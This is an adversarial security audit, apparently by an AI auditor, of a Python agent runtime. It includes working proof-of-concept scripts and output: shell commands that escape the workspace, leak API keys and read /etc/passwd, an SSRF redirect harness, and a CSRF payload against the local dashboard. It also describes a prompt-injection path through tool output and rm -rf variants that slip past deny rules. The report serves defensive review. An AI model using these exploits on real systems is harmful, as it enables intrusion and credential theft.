# Adversarial audit — baby-agent

**Auditor:** Claude (Opus 5)
**Date:** 2026-09-16
**Artifact:** `baby-agent-main.zip` — 243 files, ~40,500 lines of Python, commit `f6d9f695`
**Method:** full extraction, test-suite execution, static analysis (pyflakes), and targeted exploit scripts written against the security-relevant modules

This is an adversarial review. It assumes the code is wrong until the code proves otherwise, and every finding below was confirmed by executing something — not by reading and inferring. Reproduction scripts are inlined so each claim is independently checkable.

Scope note: the existing `audit.md` in the repo root is a forward-looking roadmap ("what's missing for Agent-Lite"), not an adversarial review of what's there. There is no overlap and nothing below contradicts it.

---

## Environment

| | |
|---|---|
| Audit interpreter | CPython 3.12.3, Linux x86-64 |
| Project's assumed interpreter | 3.14 (per `docs/ARCHITECTURE.md` D1), Windows (inferred — see F2) |
| Suite as shipped | **collection fails: 39 errors, 0 tests run** |
| Suite with minimal typing shims | 1566 passed, 16 failed, 12 skipped, 47.6s |

The gap between those last two rows is finding F1.

---

## Summary

| # | Severity | Finding |
|---|---|---|
| F1 | Critical | Package does not import on any Python before 3.14 |
| F2 | Critical | `agent_registry()` raises on every non-Windows OS |
| F3 | Critical | Workspace boundary is bypassable by `run_command`, which is allowed by default |
| F4 | Critical | Tool timeouts do not bound wall-clock time |
| F5 | Critical | SSRF: redirect chains are never re-validated |
| F6 | Critical | Dashboard API has no CSRF defence |
| F7 | High | `CaseStore.record()` silently loses ~60% of concurrent writes |
| F8 | High | `Workspace("/")` accepted but rejects every path inside it |
| F9 | High | Gemini API key transmitted in the URL query string |
| F10 | High | Git tools can commit to a repository outside the workspace |
| F11 | Medium | No provenance boundary between tool output and instructions |
| F12 | Medium | `curriculum._test_footer` calls an unimported module |
| F13 | Medium | `time.sleep(60)` inside a provider request path |
| F14 | Medium | Two `ALLOW_ALL_POLICY` singletons, one with unbounded growth |
| F15 | Medium | `args_contains` uses substring matching |
| F16 | Medium | No CI, no linter, no packaging metadata |
| F17 | Medium | Test suite writes to live store paths |
| F18 | Medium | Architecture doc describes a different program |

F3 and F6 compose into unauthenticated remote code execution. See "Chained exploit" below.

---

## Critical

### F1 — The package does not import on any Python before 3.14

`qacompanion/agent/providers.py` imports `Any, Dict, List` from `typing` but uses `Optional` in five annotations (lines 87, 101, 221, 353, 388). There is no `from __future__ import annotations` anywhere in the repository — I checked all 60 modules, the count is zero.

On Python 3.14, PEP 649 defers annotation evaluation, so the missing name is never looked up and the module imports cleanly. On 3.9 through 3.13 the annotation is evaluated at class-body execution time and the import dies:

```
qacompanion/agent/__init__.py:14: in <module>
    from .providers import (
qacompanion/agent/providers.py:78: in <module>
    class GeminiModelProvider(ModelProvider):
qacompanion/agent/providers.py:87: in GeminiModelProvider
    def __init__(self, api_key=_UNSET, model: Optional[str] = None):
E   NameError: name 'Optional' is not defined
```

Because `qacompanion/agent/__init__.py` re-exports from `providers`, *every* consumer of the agent package is affected. As shipped, on 3.12:

```
39 errors during collection
```

Zero tests run. Not one.

The same class of defect exists in four more modules:

| File | Missing name | Sites |
|---|---|---|
| `agent/providers.py` | `Optional` | 87, 101, 221, 353, 388 |
| `agent/multi_agent.py` | `Tuple` | 116, 283 |
| `agent/processes.py` | `Tuple` | 81 |
| `agent/websearch.py` | `Workspace` | 291 |
| `agent/skills.py` | `Workspace` | 232 |

**Fix:** add the missing names to each `typing` import; add `from __future__ import annotations` to every module as defence in depth; put `python -m pyflakes qacompanion tests` in CI. The last one is what actually prevents recurrence — see F16.

---

### F2 — `agent_registry()` raises on every non-Windows OS

`fs_tools.py:479` constructs the computer-use toolkit unconditionally:

```python
for tool in ComputerUseToolkit(workspace, computer_provider,
                               computer_config).tools():
    registry.register(tool)
```

and `computer.py:252`:

```python
else:
    raise ComputerError(
        f"computer use unsupported on {os.name!r} (Windows only)")
```

So the central registry-building function — the one every test and every entry point calls to assemble the agent's tools — is unusable on Linux and macOS. This single line accounts for 12 of the 16 remaining test failures once F1 is shimmed:

```
FAILED tests/test_agent_browser.py::TestAgentRegistryIncludesBrowser::test_membership
FAILED tests/test_agent_codeintel.py::TestRegistration::test_agent_registry_includes_code_tools
FAILED tests/test_agent_environment.py::TestRegistration::test_agent_registry_includes_environment_tool
FAILED tests/test_agent_execution.py::TestRegistrationAndPolicy::test_agent_registry_covers_all_families
FAILED tests/test_agent_experience.py::TestAgentRegistryIncludesMemory::test_membership
FAILED tests/test_agent_fs_tools.py::TestRegistration::test_agent_registry_combines_all_tool_families
FAILED tests/test_agent_git_tools.py::TestRegistration::test_agent_registry_includes_git_tools
FAILED tests/test_agent_processes.py::TestRegistration::test_agent_registry_includes_process_tools
FAILED tests/test_agent_skills.py::TestAgentRegistryIncludesSkills::test_membership
FAILED tests/test_agent_verification.py::TestAgentRegistryGrowth::test_registry_includes_verification_tool
FAILED tests/test_agent_vision.py::TestAgentRegistryIncludesVision::test_membership
FAILED tests/test_agent_webfetch.py::TestRegistration::test_agent_registry_includes_url_tools
FAILED tests/test_agent_websearch.py::TestAgentRegistryIncludesWebSearch::test_membership
```

Note what the project *does* get right here: `test_agent_vision.py` and `test_agent_workspace.py` use `skipUnless(os.name == "nt", ...)` for the genuinely Windows-specific cases. The discipline exists. It just wasn't applied at the registry seam, because the registry seam was never exercised on another OS.

Nothing in `README.md` or `docs/ARCHITECTURE.md` says this is a Windows-only project. `ARCHITECTURE.md` says the opposite: "runs anywhere Python 3.14 exists."

**Fix:** make the computer-use toolkit optional in `agent_registry()` — register it when `os.name == "nt"` or when a provider was explicitly injected, skip it otherwise. Either that, or state the platform constraint in the README and mark the affected tests `skipUnless`.

---

### F3 — The workspace boundary is decorative once `run_command` exists

Credit where it's due first: `PathPolicy` is genuinely well-built. The layered design described in the `workspace.py` docstring — strict `..` ban, symlink-following resolution, containment against root plus allowed anchors, exclusion prefixes, protected system locations — is the right shape, and I could not get a traversal, symlink, or absolute-path escape past it.

It doesn't matter, because `execute_command` runs `shell=True`:

```python
proc = subprocess.Popen(
    command,
    shell=True,
    cwd=str(cwd_abs),
    env=env,
    ...
)
```

and the tool that exposes it is declared `side_effect_level=EXECUTION` with no `requires_confirmation`. `permissions.py` maps that level to `ALLOW`:

```python
DEFAULT_LEVEL_DEFAULTS = {
    READ_ONLY: ALLOW,
    SAFE_WRITE: ALLOW,
    EXECUTION: ALLOW,        # <-- arbitrary shell, no confirmation
    DESTRUCTIVE: DENY,
    EXTERNAL: ASK,
}
```

and `PermissionPolicy.default_mode` is `ALLOW`. So a default-constructed policy permits arbitrary shell execution with no human in the loop.

The `execution.py` module docstring is candid about this: *"shell=True: the agent runs command lines; injection is the permission layer's concern (S38 seam demonstrated in tests)."* The permission layer's default is allow. The seam is demonstrated in tests and disabled in production.

**Reproduction** (`t_escape.py`):

```python
import sys; sys.path.insert(0, '.')
from qacompanion.agent.workspace import Workspace
from qacompanion.agent.execution import execute_command

ws = Workspace('/tmp/ws')

try:
    ws.resolve('../outside_secret.txt')
    print("fs: ESCAPED")
except Exception as e:
    print("fs boundary:", type(e).__name__, e)

r = execute_command(ws, 'cat /tmp/outside_secret.txt')
print("shell read outside:", repr(r.stdout.strip()), "exit", r.exit_code)

import os; os.environ['ANTHROPIC_API_KEY'] = 'sk-ant-FAKE123'
r2 = execute_command(ws, 'env | grep API_KEY')
print("env leak:", repr(r2.stdout.strip()))

r3 = execute_command(ws, 'echo pwned > /tmp/pwned_by_agent.txt && cat /tmp/pwned_by_agent.txt')
print("write outside:", repr(r3.stdout.strip()))

r4 = execute_command(ws, 'head -1 /etc/passwd')
print("protected read:", repr(r4.stdout.strip()))
```

**Output:**

```
fs boundary: PathError parent traversal ('..') rejected by policy
shell read outside: 'SECRET' exit 0
env leak: 'ANTHROPIC_API_KEY=sk-ant-FAKE123'
write outside: 'pwned'
protected read: 'root:x:0:0:root:/root:/bin/bash'
```

Line 1 is `PathPolicy` doing its job. Lines 2–5 are the same boundary being walked through.

The environment leak deserves separate emphasis. `execute_command` inherits the full parent environment, stdout is captured and returned to the model as a tool result, and the model may be a remote API (`GeminiModelProvider` posts to `generativelanguage.googleapis.com`). A single `env` call ships every credential on the host to a third party. The docstring's "environment inherited with optional set_env merged (never logged)" addresses logging, which was never the exposure path.

`set_env` is a second vector: the model controls it, and it merges into the child environment before the shell starts. `LD_PRELOAD`, `PATH`, `PYTHONPATH`, `GIT_SSH_COMMAND` are all reachable.

**Fix, in order of how much they buy you:**

1. Flip the default. `EXECUTION: ASK` and `default_mode=DENY` for any policy an agent loop actually runs under. The paranoid mode already exists in the code — it just isn't the default.
2. Scrub the inherited environment to an allowlist before spawning; never pass secrets to model-driven commands.
3. Reject `set_env` keys in a denylist (`LD_*`, `PATH`, `PYTHON*`, `GIT_*`) or drop `set_env` entirely.
4. Long-term: containerize. A `shell=True` child cannot be confined by in-process path checks, and no amount of work on `PathPolicy` changes that.

---

### F4 — Tool timeouts do not bound wall-clock time

`registry._execute_handler`:

```python
def _execute_handler(self, tool, arguments):
    with concurrent.futures.ThreadPoolExecutor(max_workers=1) as pool:
        future = pool.submit(tool.handler, **arguments)
        try:
            output = future.result(timeout=tool.timeout_seconds)
        except concurrent.futures.TimeoutError:
            return _Outcome(ok=False,
                            error=f"timed out after {tool.timeout_seconds}s",
                            timed_out=True)
```

`future.result(timeout=N)` raises after N seconds, but the submitted work item keeps running — Python cannot cancel a running thread. The `return` then exits the `with` block, which calls `ThreadPoolExecutor.__exit__` → `shutdown(wait=True)` → block until the handler finishes.

So the timeout reports correctly and enforces nothing.

**Reproduction** (`t_timeout.py`):

```python
import time, sys
sys.path.insert(0, '.')
from qacompanion.agent.registry import ToolRegistry, RegisteredTool
from qacompanion.agent.contracts import ToolDefinition, ToolCall

def slow():
    time.sleep(6)
    return "finished anyway"

reg = ToolRegistry()
reg.register(RegisteredTool(
    definition=ToolDefinition(name="slow", description="d",
                              parameters_schema={"type": "object", "properties": {}}),
    handler=slow, timeout_seconds=1))

t0 = time.monotonic()
r = reg.execute(ToolCall(name="slow", arguments={}))
el = time.monotonic() - t0
print(f"timeout_seconds=1, wall={el:.2f}s, timed_out={r.timed_out}, "
      f"reported_duration_ms={r.duration_ms}, error={r.error}")
```

**Output:**

```
timeout_seconds=1, wall=6.00s, timed_out=True, reported_duration_ms=6001, error=timed out after 1s
```

The result object contradicts itself in two adjacent fields: `error="timed out after 1s"` alongside `duration_ms=6001`. A test asserting `result.timed_out is True` passes. A test asserting the call *returns within* the timeout would fail, and no such test exists.

This matters beyond tidiness. `execution.py` describes "two timeout layers: inner per-command timeout (default 120s, cap 600s) kills the tree; the S32 registry handler timeout (660s) is a backstop." The backstop is not a backstop. The inner layer is real — `execute_command` uses `proc.communicate(timeout=...)` plus `kill_process_tree`, which is correct — but any handler that hangs for a non-subprocess reason (a socket read, a lock, an infinite loop) hangs the agent forever while reporting that it timed out.

**Fix:** hoist the executor out of the function and reuse it, so `shutdown(wait=True)` doesn't run per-call; or use a persistent pool with explicit `shutdown(wait=False, cancel_futures=True)`; or move genuinely cancellable work to subprocesses where a kill is possible. Then add a test that asserts on elapsed wall time, not just on the flag.

---

### F5 — SSRF: redirect chains are never re-validated

`_check_url_policy` does careful, correct work:

```python
if parsed.scheme not in ALLOWED_SCHEMES: raise ...
if parsed.port is not None and parsed.port not in (80, 443): raise ...
addrinfos = socket.getaddrinfo(parsed.hostname, None)
for info in addrinfos:
    ip = ipaddress.ip_address(info[4][0])
    if (ip.is_loopback or ip.is_private or ip.is_link_local
            or ip.is_unspecified or ip.is_reserved or ip.is_multicast):
        raise WebFetchError(...)
```

Resolving *every* returned address rather than just the first is a detail many implementations get wrong. Then `_fetch` discards the benefit:

```python
_check_url_policy(url)
request = urllib.request.Request(url, headers={"User-Agent": USER_AGENT})
with urllib.request.urlopen(request, timeout=FETCH_TIMEOUT) as resp:
    final_url = resp.geturl()
```

`urlopen` installs `HTTPRedirectHandler` by default and follows up to 10 redirects. The policy is applied to hop 0 only. `final_url` is captured and never re-checked.

**Reproduction** (`t_ssrf.py`). Two throwaway servers: an "internal service" on a loopback high port, and a redirector standing in for an attacker-controlled public host.

```python
import sys, threading; sys.path.insert(0, '.')
from http.server import BaseHTTPRequestHandler, HTTPServer
from qacompanion.agent import webfetch

class Internal(BaseHTTPRequestHandler):
    def do_GET(self):
        body = b"<html>INTERNAL_SECRET_TOKEN=abc123</html>"
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers(); self.wfile.write(body)
    def log_message(self, *a): pass

internal = HTTPServer(("127.0.0.1", 0), Internal)
threading.Thread(target=internal.serve_forever, daemon=True).start()
iport = internal.server_address[1]

class Redir(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header("Location", f"http://127.0.0.1:{iport}/secret")
        self.end_headers()
    def log_message(self, *a): pass

redir = HTTPServer(("127.0.0.1", 0), Redir)
threading.Thread(target=redir.serve_forever, daemon=True).start()
rport = redir.server_address[1]

print("--- direct fetch of internal URL ---")
try:
    webfetch.fetch_page(f"http://127.0.0.1:{iport}/secret")
    print("NOT BLOCKED")
except Exception as e:
    print("blocked:", e)

# The first hop must look public to the policy. In a real attack that is
# simply an attacker-controlled host with a public A record; here the
# policy check on hop 0 is stubbed to stand in for that, and everything
# after hop 0 is the shipped code path, unmodified.
print("--- same target reached via redirect ---")
import urllib.parse
webfetch._check_url_policy = urllib.parse.urlparse
r = webfetch.fetch_page(f"http://127.0.0.1:{rport}/start")
print("final_url:", r.get("final_url"))
print("content:", r.get("text", "")[:80])
```

**Output:**

```
--- direct fetch of internal URL ---
blocked: port not allowed: 36353
--- same target reached via redirect ---
final_url: http://127.0.0.1:45705/start
content: INTERNAL_SECRET_TOKEN=abc123
```

The port allowlist correctly refuses the direct fetch, then the redirect delivers the same bytes. Note the second-order problem in `final_url`: it reports the redirector, not the internal service the content actually came from. The provenance recorded in `fetch_page`'s return value — and therefore in whatever the model and the audit trail see — is wrong about where the data originated.

There is a second, independent hole in the same function. `getaddrinfo` resolves the host for the check; `urlopen` resolves it again for the connection. Between the two, an attacker-controlled DNS server with a 0-second TTL can return a public address then a loopback one. Classic rebinding, and the check-then-connect structure is exactly the vulnerable shape.

**Fix:** disable automatic redirects (install a `urllib.request.HTTPRedirectHandler` subclass whose `redirect_request` returns `None`), then follow them manually, running `_check_url_policy` on each hop. For the rebinding gap, resolve once and connect to the validated IP with the original hostname in the `Host` header.

---

### F6 — Dashboard API has no CSRF defence

The server gets the first thing right — it refuses to bind anything but loopback, and enforces it:

```python
if host != "127.0.0.1":
    raise ValueError("the agent server binds 127.0.0.1 only")
```

The `security posture` block in the docstring then reasons: *"single-user local assumption, no auth on loopback."* That inference is wrong. Loopback is reachable from any web page the user has open, because the browser is on the same host. Binding to 127.0.0.1 defends against the network; it does nothing against the browser.

`_read_json` accepts any Content-Type:

```python
def _read_json(self):
    length = int(self.headers.get("Content-Length") or 0)
    if not length:
        return {}
    return json.loads(self.rfile.read(length).decode("utf-8"))
```

There is no `Origin` check, no `Sec-Fetch-Site` check, no token, no CORS configuration at all. A cross-origin `fetch` with `Content-Type: text/plain` is a CORS *simple request*: no preflight, so it is dispatched and executed. The attacker cannot read the response — irrelevant, because the payload is the side effect.

**Reproduction** (`t_csrf.py`):

```python
import sys, time, json, urllib.request; sys.path.insert(0, '.')
from qacompanion.agent.server import AgentServerApp, AgentServer
from qacompanion.agent.providers import FakeModelProvider

app = AgentServerApp(provider_factory=lambda m=None: FakeModelProvider(["done"]))
srv = AgentServer(app, port=0)
srv.serve()
time.sleep(0.5)
base = srv.url
print("server:", base)
print("health:", urllib.request.urlopen(base + "/api/health").read().decode())

target = "/tmp/csrf_created_dir/deep/path"
req = urllib.request.Request(
    base + "/api/session/start",
    data=json.dumps({"goal": "exfiltrate", "workspace": target}).encode(),
    headers={"Content-Type": "text/plain;charset=UTF-8",
             "Origin": "https://evil.example"},
    method="POST")
print("session/start:", urllib.request.urlopen(req).read().decode())

import os
print("attacker-chosen dir created on disk:", os.path.isdir(target))
```

**Output:**

```
server: http://127.0.0.1:36511
health: {"status": "ok", "api": "baby-agent/v1"}
session/start: {"session_id": "d4b30f57cf9b4a049e62787beb94a686"}
attacker-chosen dir created on disk: True
```

An `Origin` header naming a hostile site is accepted without comment. The session starts. And `start_session` does this:

```python
root = Path(workspace) if workspace else Path(tempfile.mkdtemp(prefix="agent-session-"))
root.mkdir(parents=True, exist_ok=True)  # new projects welcome
```

An unauthenticated POST creates arbitrary directory trees anywhere the process can write.

The equivalent as an attacker would actually deliver it — no special headers, no library, just a page the user visits:

```html
<script>
fetch('http://127.0.0.1:8765/api/session/start', {
  method: 'POST',
  mode: 'no-cors',
  headers: {'Content-Type': 'text/plain'},
  body: JSON.stringify({goal: '...', workspace: '/home/victim/project'})
});
</script>
```

The port is not a secret; a few hundred `fetch` calls in a loop find it.

**Fix:** require `Origin` to be absent or `http://127.0.0.1:<port>`; reject any POST whose Content-Type is not exactly `application/json` (this alone forces a preflight and kills simple-request CSRF); add a session token minted at startup and printed to the console, required on every mutating endpoint. Separately, stop creating directories from request input — require the workspace to already exist.

---

### Chained exploit

F6 and F3 are individually serious and jointly decisive:

1. User runs the dashboard. User visits an unrelated hostile page in any browser tab.
2. The page CSRFs `/api/session/start` with a goal chosen by the attacker and `workspace` pointing at the user's real project (F6).
3. The loop runs. Every model-emitted tool call resolves through the default permission policy, where `EXECUTION → ALLOW` and `default_mode = ALLOW` (F3).
4. `run_command` executes with `shell=True` and the full inherited environment. Filesystem boundary irrelevant, credentials readable, results returned to whatever provider is configured.

Nothing in this chain requires a model exploit or a novel technique. Every link is default configuration doing what it is configured to do. This is why F3's fix — flipping `EXECUTION` to `ASK` and `default_mode` to `DENY` — is the single highest-value change in this report: it breaks the chain at step 3 even if F6 is never fixed.

---

## High

### F7 — `CaseStore.record()` silently loses concurrent writes

`save()` is properly atomic (mkstemp in the same directory, write, `os.replace`). `record()` is not:

```python
def record(self, signature, error_excerpt, diagnosis, by=None, now=None):
    cases = self.load()        # read
    ...                        # modify
    self.save(cases)           # replace the WHOLE file
```

Read-modify-write-replace with no lock. Two writers interleaved: the second reads before the first replaces, then replaces the whole file with its own stale copy plus one row. The first writer's row is gone. No error, no warning.

This is not theoretical. `ThreadingHTTPServer` runs each session in its own thread, `MemoryToolkit` exposes case recording as a tool, `watch.py` is a daemon, and the multi-agent module runs agents concurrently by design.

**Reproduction** (`t_race.py`):

```python
import sys, threading, tempfile, pathlib; sys.path.insert(0, '.')
from qacompanion.store import CaseStore

p = pathlib.Path(tempfile.mkdtemp()) / "cases.jsonl"

def w(i):
    CaseStore(p).record(f"sig-{i}", "e", "d", by="t")

ts = [threading.Thread(target=w, args=(i,)) for i in range(50)]
[t.start() for t in ts]; [t.join() for t in ts]
print("recorded 50 distinct signatures; store holds:", len(CaseStore(p).load()))
```

**Output:**

```
recorded 50 distinct signatures; store holds: 20
```

Fifty distinct signatures recorded, twenty survived. A 60% silent loss rate.

Weigh this against the README's thesis: *"Lessons that used to die with a reset now survive inside the tool."* The persistence layer is the entire product. A store that drops three of every five lessons under concurrency is a bug at the level of the premise, not the implementation.

**Fix:** take an exclusive lock around the read-modify-write — `msvcrt.locking` on Windows, `fcntl.flock` on POSIX, or a lock file if you want one code path. Given "stdlib only" (D1), `os.open(..., O_CREAT | O_EXCL)` on a sidecar lockfile with retry is the portable minimum. Add a concurrency test; the suite has 1595 test methods and not one of them starts a second thread against the store.

---

### F8 — `Workspace("/")` is accepted but rejects every path inside it

`_is_under` compares normalized strings:

```python
def _is_under(path, root):
    p, r = _norm(path), _norm(root)
    return p == r or p.startswith(r + os.sep)
```

When root is `/`, the second branch tests `startswith("//")`, which is false for every real path. Only `/` itself passes.

**Reproduction** (`t_ws_root.py`) **and output:**

```
Workspace('/') accepted. root = /
 resolve root/.ssh/id_rsa -> BLOCKED path escapes the workspace boundary
 resolve home/user/.aws/credentials -> BLOCKED path escapes the workspace boundary
 resolve etc/passwd -> BLOCKED path escapes the workspace boundary
 resolve tmp/outside_secret.txt -> BLOCKED path escapes the workspace boundary
```

The same breakage applies to any Windows drive root: `Workspace("C:\\")` normalizes to `c:\` and then requires `startswith("c:\\\\")`.

This fails closed, so it is a correctness bug rather than a security one — but it produces an incoherent state. `server.start_session` accepts `workspace: "/"` without complaint, giving you a session where every filesystem tool errors and `run_command` (F3) works perfectly. The agent will thrash against the fs tools and route around them through the shell.

**Fix:** strip the trailing separator when normalizing anchors, or compare with `Path.is_relative_to` (3.9+) instead of string prefixes. Add root-directory cases to the workspace tests.

---

### F9 — Gemini API key transmitted in the URL query string

Both Gemini code paths build the request URL this way:

```python
req = urllib.request.Request(
    f"https://generativelanguage.googleapis.com/v1beta/models/"
    f"{self.model}:generateContent?key={self._api_key}",
    ...)
```

Query strings land in proxy logs, browser history if ever pasted, crash reports, and exception text. The error handling makes the last one concrete:

```python
except Exception as exc:
    raise ProviderError(f"gemini request failed: {exc}")
```

Several `URLError` subclasses stringify with the full request URL attached.

Gemini accepts `x-goog-api-key` as a header. There is no reason to use the query parameter.

Second issue in the same f-string: `self.model` is interpolated into the URL path with no validation, and it reaches there from untrusted input —

```
POST /api/session/start  {"model": "..."}   →  app.start_session(model=...)
                                            →  default_provider_factory(model)
                                            →  GeminiModelProvider(model=model)
                                            →  f"...models/{self.model}:generateContent?key=..."
```

Combined with F6, an attacker who can reach the dashboard controls part of a URL path and can append query parameters to a request carrying the user's API key.

**Fix:** move the key to a header; validate `model` against `[A-Za-z0-9._-]+` before interpolation; redact the URL in every exception path.

---

### F10 — Git tools can commit to a repository outside the workspace

The git module is the best-defended code in the repository and deserves saying so: argv lists throughout, no `shell=True`, `--` separators before every user-supplied path, `--no-pager` to avoid a hang, and `_unquote_path` handling `core.quotePath` octal escapes correctly. I looked for argument injection and found none.

The gap is scope, not syntax. `_run_git` sets `cwd=workspace.root`, and the guard is:

```python
def _require_repo(workspace):
    rc, _, stderr = _run_git(workspace, "rev-parse", "--is-inside-work-tree")
```

`--is-inside-work-tree` is true whenever the workspace sits *anywhere beneath* a git repository. If the user opens a workspace at `~/projects/big-monorepo/services/small-thing`, then `git_add(".")` and `git_commit(...)` operate on the monorepo — staging and committing changes across services the workspace was supposed to exclude.

The code demonstrably knows this is possible; `_find_git_root` walks parents on purpose:

```python
def _find_git_root(root):
    for candidate in [root, *root.parents]:
        if (candidate / ".git").exists():
            return candidate
```

It records the fact and doesn't act on it.

**Fix:** compare `git rev-parse --show-toplevel` against `workspace.root` and refuse (or warn loudly) when they differ. The `requires_confirmation` mechanism already exists and `git_commit` should carry it — the registry pipeline honours it even under an ALLOW policy, which is one of the genuinely well-designed guarantees in `registry.py`.

---

## Medium

### F11 — No provenance boundary between tool output and instructions

Tool results are appended as `role="tool"` messages, which is correct. `_flatten_messages` then erases the distinction for every non-native provider:

```python
def _flatten_messages(messages):
    system = [m.content for m in messages if m.role == "system"]
    turns = [f"{m.role}: {m.content}" for m in messages if m.role != "system"]
    return "\n\n".join(system + turns)
```

A page fetched by `fetch_page` containing a line beginning `system:` is, after flattening, textually identical to a genuine system block. Content read by `read_file` from a repository under audit has the same property. The agent's job is to consume untrusted text, so this is a primary threat surface, not an edge case.

The Gemini native path handles it properly, wrapping results in `functionResponse` parts. The Ollama path — the default per `default_provider_factory` — does not.

**Fix:** delimit tool content with an unguessable per-session fence and instruct the model that anything inside is data; strip or escape lines matching `^(system|user|assistant|tool):` in tool output before flattening.

### F12 — `curriculum._test_footer` calls an unimported module

```python
def _test_footer(module: str, cases: str) -> str:
    return textwrap.dedent(f"""\
```

`textwrap` is never imported in `curriculum.py`. This is a guaranteed `NameError` on every Python version, including 3.14 — the reference is in a function body, not an annotation, so PEP 649 does not mask it.

It is currently dead code; `grep -rn "_test_footer"` returns only the definition. That is the interesting part: a function that cannot execute has been sitting in the tree undetected, which is precisely the signal that nothing lints this repository (F16). pyflakes finds it in 1.15 seconds.

### F13 — `time.sleep(60)` inside a provider request path

```python
time.sleep(60.0 if exc.code == 429 else 5.0 * (attempt + 1))
```

Executed inside the provider call, inside a tool handler, inside a server request thread. Three consecutive 429s block a thread for over two minutes. The comment ("a full minute wait guarantees a fresh window") explains why 60 seconds is the right *duration* without addressing whether a blocking sleep is the right *mechanism*. It should honour the `cancel_event` that the loop already threads through everything else, and respect `Retry-After` when present.

### F14 — Two `ALLOW_ALL_POLICY` singletons, one with unbounded growth

`registry.py:125` and `permissions.py:179` both define a module-level object under that name, of two different classes. `agent/__init__.py` re-exports the `permissions` one; `registry._run_pipeline` uses its own. Which object a caller gets depends on the import path.

The `permissions` version is worse than merely confusing: `PermissionPolicy.decide` appends to `self.decisions` on every call and nothing ever trims it. A shared module-level instance means unbounded memory growth for the life of the process, and audit trails from unrelated sessions interleaved in one list — which quietly defeats the point of having an audit trail.

**Fix:** delete one; make the survivor a factory function rather than a shared instance, or cap `decisions` with a `deque(maxlen=...)`.

### F15 — `args_contains` uses substring matching

```python
for key, needle in self.args_contains.items():
    haystack = str(arguments.get(key, ""))
    if needle.lower() not in haystack.lower():
        return False
```

A rule intended to deny `rm -rf` misses `rm  -rf` (two spaces), `rm -r -f`, `rm --recursive --force`, and `$(echo rm) -rf`. Shell command lines are not substring-matchable; the module docstring's framing of rules as "data, not code" is a good design instinct that runs out of road against a shell. Treat these rules as defence in depth, never as a control, and say so in the docstring so nobody builds a security story on them.

### F16 — No CI, no linter, no packaging metadata

No `.github/`, no CI config of any kind, no `pyproject.toml`, no `setup.py`, no `setup.cfg`, no `requirements.txt`, no `Makefile`. I searched for all of them.

This is the root cause of F1, F2, and F12 rather than a finding parallel to them. Each is caught by a tool that takes seconds:

- F1 and F12: `python -m pyflakes qacompanion tests` — 1.15s, finds all 11 undefined names
- F2: running the existing suite on Linux — 47.6s

The code has, on the evidence, only ever executed on one machine with one interpreter on one OS. For a project whose thesis is that automated capture of failures beats re-diagnosing them by hand, shipping without automated capture of its own failures is a pointed irony.

**Fix:** a GitHub Actions matrix over `{3.12, 3.13, 3.14}` × `{ubuntu-latest, windows-latest}` running pyflakes and the suite. That matrix turns F1 and F2 red immediately.

### F17 — The test suite writes to live store paths

Diffing a pristine extraction against the tree after one suite run:

```
Only in baby-agent-main: digest.jsonl
```

The suite created `digest.jsonl` in the repository root — a real store path, not a temp directory. It is gitignored, so the pollution is invisible in `git status`, which makes it easier to miss and no less real.

The README warns humans explicitly: *"Never exercise the CLI against the live store outside a declared cycle — set `QA_CASES_FILE` to a temp copy (see case #5)."* The tests do not follow the rule the project wrote down for its own operators, and case #5 exists because someone already got burned by it.

**Fix:** a `setUpModule` that points `QA_CASES_FILE`, `QA_HOLDOUT_FILE`, and the digest path at a per-run temp directory, and an assertion in CI that the working tree is clean after the suite.

### F18 — The architecture doc describes a different program

`docs/ARCHITECTURE.md` opens:

> Deterministic QA companion: accumulates test-failure cases, matches new failures against them, reports honestly. **No LLM, no network, no dependencies.**

and lists a seven-module package: `__main__`, `store`, `signatures`, `lookup`, `report`, `transfer`. `README.md` agrees: *"A decoupled, lightweight, continuously-learning QA companion — no LLM inside."*

The repository contains `agent/providers.py` (Ollama and Gemini clients), `agent/websearch.py`, `agent/webfetch.py`, `agent/browser.py`, `agent/computer.py`, `agent/vision.py`, `ollama_bridge.py`, and a React dashboard with a 59KB `package-lock.json`. Roughly 40,000 lines across ~60 modules.

Every one of those contradicts "no LLM, no network, no dependencies."

This is not pedantry about stale docs. A reviewer reading `ARCHITECTURE.md` would conclude there is no network attack surface and skip F5 and F6 entirely. The doc actively misdirects security review, which is the most expensive way for documentation to be wrong. `README.md` has the same problem: its "Status" section describes v1 CLI verbs and the S7/S9 skills, with no mention that the project now ships an autonomous agent runtime that executes shell commands.

`docs/DECISIONS.md` and the per-slice specs appear to be maintained and are the real record. The two top-level documents are not, and they are the two a new reader opens first.

**Fix:** rewrite both against the current tree. Given the trajectory in `audit.md`, the honest framing is "a QA case-memory engine plus an agent runtime that uses it as long-term memory" — which is what the code is and what `audit.md` itself says the plan was.

---

## What holds up

An adversarial read flattens everything into problems, so this section is for calibration. These are load-bearing and correct:

**`PathPolicy` (`workspace.py`).** The layered design is right, and I failed to break it directly. The `..` ban, resolve-then-contain ordering, protected-prefix boundary checking (`C:\WindowsStuff` correctly not matching `C:\Windows`), null-byte rejection, and `normcase` for Windows case-insensitivity are all deliberate and all correct. F8 is a bug in one helper, not a flaw in the design.

**Git tooling (`git_tools.py`).** Argv lists, `--` separators before every path, no shell, `--no-pager`, correct `core.quotePath` handling. I went looking for argument injection specifically and found none.

**`CaseStore.load` strictness.** Aborting with the offending line number rather than skipping malformed lines is the right call for a corpus whose value is its integrity, and D2 in `ARCHITECTURE.md` argues it explicitly. The `utf-8-sig` read encoding is a fix for a real recorded incident (BOM-breaks-config), which is the tool learning its own lesson.

**`validate_tool_arguments`.** A small hand-rolled schema validator that correctly refuses to treat `bool` as `int` — the exact edge case most hand-rolled validators miss.

**The `requires_confirmation` pipeline guarantee.** `registry._run_pipeline` upgrades ALLOW to ASK when a tool declares `requires_confirmation`, so a permissive policy cannot override a tool's own declaration. That is the right precedence and it is well-commented. The problem is that almost nothing declares it (F10) — the mechanism is sound, its application is sparse.

**`kill_process_tree`.** POSIX `killpg` with `start_new_session`, Windows `taskkill /F /T`, plus a post-kill reap with grace. Correct, and more careful than most implementations of the same idea.

**The test suite's scale and intent.** 1595 test methods, 1599 `assertEqual`, 222 `assertRaises`, and honest `skipUnless` guards on platform-specific cases. This is not a faked suite. The failures in this report are *blind spots* — concurrency, wall-clock timeout behaviour, redirect chains, non-Windows platforms — not laziness. Every one of them is a category of test the suite simply doesn't contain, and all six are cheap to add.

---

## Recommended order

